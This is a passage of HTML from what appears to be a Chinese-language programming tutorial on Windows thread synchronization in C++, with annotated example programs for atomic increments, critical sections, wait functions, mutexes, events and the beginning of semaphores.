class="line">&#x2F;&#x2F; mov         eax, dword ptr[Number][0]: Number(3)</span><br><span class="line">&#x2F;&#x2F; add         eax, 1[1]: Number(3)  eax(4)</span><br><span class="line">&#x2F;&#x2F; mov         dword ptr[Number],eax[1]: Number(4)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; mov         dword ptr[Number],eax[0]: Number(3)-----------</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子操作: 将对整数进行的简单运算转换成原子操作</span></span><br><span class="line"><span class="comment">// 缺点: 只能保护整数，不能保护一段代码</span></span><br><span class="line"><span class="comment">// 相关函数: InterlockedXXXX()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量，同时被多个线程访问</span></span><br><span class="line"><span class="keyword">long</span> Number = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数1</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadA</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 原子操作: 将传入的数值自增</span></span><br><span class="line">InterlockedIncrement(&amp;Number);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上将运算转换成了一条原子操作的汇编</span></span><br><span class="line"><span class="comment">// lock inc dword ptr[Number]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数2</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadB</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">InterlockedIncrement(&amp;Number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadA, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadB, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个线程同时执行结束</span></span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 临界区: 可以保护一段代码</span></span><br><span class="line"><span class="comment">// 特点: 有线程拥有者的概念，拥有者线程可以无限次进入当前代码块</span></span><br><span class="line"><span class="comment">// 缺点: 如果线程崩溃，会导致死锁。</span></span><br><span class="line"><span class="comment">// 相关函数: </span></span><br><span class="line"><span class="comment">//初始化: InitializeCriticalSection</span></span><br><span class="line"><span class="comment">//删除临界区: DeleteCriticalSection</span></span><br><span class="line"><span class="comment">//开始保护 EnterCriticalSection</span></span><br><span class="line"><span class="comment">//结束保护 LeaveCriticalSection</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量，同时被多个线程访问</span></span><br><span class="line"><span class="keyword">long</span> Number = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临界区结构体</span></span><br><span class="line">CRITICAL_SECTION CriticalSection = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数1</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadA</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 当受保护的代码已经被执行时 LockCount = -2</span></span><br><span class="line"><span class="comment">// 并且 OwningThread 保存的时执行执行这段代码的线程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 表示需要保护的代码的开始部分</span></span><br><span class="line">EnterCriticalSection(&amp;CriticalSection);</span><br><span class="line">Number++;</span><br><span class="line"><span class="comment">// 需要保护的代码的结束部分</span></span><br><span class="line">LeaveCriticalSection(&amp;CriticalSection);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数2</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadB</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 表示需要保护的代码的开始部分</span></span><br><span class="line">EnterCriticalSection(&amp;CriticalSection);</span><br><span class="line">Number++;</span><br><span class="line"><span class="comment">// 需要保护的代码的结束部分</span></span><br><span class="line">LeaveCriticalSection(&amp;CriticalSection);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 初始化临界区</span></span><br><span class="line">InitializeCriticalSection(&amp;CriticalSection);</span><br><span class="line"></span><br><span class="line">HANDLE hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadA, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadB, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个线程同时执行结束</span></span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁临界区</span></span><br><span class="line">DeleteCriticalSection(&amp;CriticalSection);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="等待函数"><a href="#等待函数" class="headerlink" title="等待函数"></a>等待函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程 A</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadA</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 输出 0 ~ 99</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WorkerThreadAAA: %d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程 B </span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadB</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 输出 0 ~ 199</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WorkerThreadBBB: %d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE ThreadHandles[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建两个线程</span></span><br><span class="line">ThreadHandles[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, </span><br><span class="line">WorkerThreadA, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">ThreadHandles[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">WorkerThreadB, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个线程退出</span></span><br><span class="line"><span class="comment">// WaitForSingleObject(ThreadHandles[0], INFINITE);</span></span><br><span class="line"><span class="comment">// WaitForSingleObject(ThreadHandles[1], INFINITE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待多个内核对象</span></span><br><span class="line"><span class="comment">// 1. 需要等待多少个内核对象</span></span><br><span class="line"><span class="comment">// 2. 内核对象句柄的数组</span></span><br><span class="line"><span class="comment">// 3. 是否等待所有内核对象变成有信号的</span></span><br><span class="line"><span class="comment">// 4. 等待的时长，单位是毫秒</span></span><br><span class="line"><span class="comment">// WaitForMultipleObjects(2, ThreadHandles, TRUE, INFINITE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有任何一个执行完毕，另外一个就不执行了</span></span><br><span class="line">WaitForMultipleObjects(<span class="number">2</span>, ThreadHandles, FALSE, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待函数的副作用！！！！！！！！！  将有信号状态改为无信号状态</span></span><br><span class="line"><span class="comment">// 对于信号量来说，就是将信号的个数 -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 互斥体: 内核对象，有线程拥有者概念，线程崩溃会自动解锁</span></span><br><span class="line"><span class="comment">// 缺点: 执行速度慢，因为是内核对象</span></span><br><span class="line"><span class="comment">// 相关函数: </span></span><br><span class="line"><span class="comment">//创建\打开: Create\OpenMutex</span></span><br><span class="line"><span class="comment">//开始保护: WaitForSingleObject</span></span><br><span class="line"><span class="comment">//结束保护: ReleaseMutex</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 创建一个互斥体内核对象</span></span><br><span class="line"><span class="comment">// 参数1: 安全属性</span></span><br><span class="line"><span class="comment">// 参数2: 是否可以被继承</span></span><br><span class="line"><span class="comment">// 参数3: 名字，不取名字就是NULL</span></span><br><span class="line">HANDLE Mutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="string">L&quot;Mutex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量，同时被多个线程访问</span></span><br><span class="line"><span class="keyword">long</span> Number = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数1</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadA</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 当一个互斥体对象被创建的时候，处于有信号状态，可被等待</span></span><br><span class="line"><span class="comment">// 副作用: 将互斥体的拥有者设置为本线程,并修改状态为无信号</span></span><br><span class="line">WaitForSingleObject(Mutex, INFINITE);</span><br><span class="line">Number++;</span><br><span class="line"><span class="comment">// 重新将互斥体变成有信号的状态</span></span><br><span class="line">ReleaseMutex(Mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数2</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadB</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(Mutex, INFINITE);</span><br><span class="line">Number++;</span><br><span class="line">ReleaseMutex(Mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadA, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadB, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个线程同时执行结束</span></span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件: 可以选择自动还是手动</span></span><br><span class="line"><span class="comment">// 相关函数: </span></span><br><span class="line"><span class="comment">//创建:CreateEvent</span></span><br><span class="line"><span class="comment">//等待: WaitForXXXX</span></span><br><span class="line"><span class="comment">//设置有信号: SetEvent</span></span><br><span class="line"><span class="comment">//设置无信号: ResetEvent</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个事件对象</span></span><br><span class="line"><span class="comment">// 参数1： 安全属性</span></span><br><span class="line"><span class="comment">// 参数2： 是否手动，当使用手动时，不会产生副作用</span></span><br><span class="line"><span class="comment">// 参数3： 初始化的信号状态</span></span><br><span class="line"><span class="comment">// 参数4： 名字</span></span><br><span class="line">HANDLE Event = CreateEvent(<span class="literal">NULL</span>, TRUE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量，同时被多个线程访问</span></span><br><span class="line"><span class="keyword">long</span> Number = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数1</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadA</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 当处于自动模式下，使用等待函数的副作用改变信号状态，开始保护</span></span><br><span class="line"><span class="comment">// 【当处于手动模式下，等待函数不会产生副作用】</span></span><br><span class="line">WaitForSingleObject(Event, INFINITE);</span><br><span class="line"><span class="comment">// ResetEvent(Event);   手动的调用 Reset 没有作用</span></span><br><span class="line">Number++;</span><br><span class="line"><span class="comment">// 重新设置为有信号状态</span></span><br><span class="line">SetEvent(Event);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数2</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadB</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(Event, INFINITE);</span><br><span class="line"><span class="comment">// ResetEvent(Event);   手动的调用 Reset 没有作用</span></span><br><span class="line">Number++;</span><br><span class="line">SetEvent(Event);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadA, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadB, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个线程同时执行结束</span></span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 信号量: 可以设置多把锁</span></span><br><span class="line"><span class="comment">// 相关函数: </span></span><br><span class="line"><span class="comment">//创建:CreateSemaphore</span></span><br><span class="line"><span class="comment">//开始保护(上一把锁): WaitForXXXX</span></span><br><span class="line"><span class="comment">//解锁: ReleaseSemaphore</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个信号量对象</span></span><br><span class="line"><span class="comment">// 参数1： 安全属性</span></span><br><span class="line"><span class="comment">// 参数2： 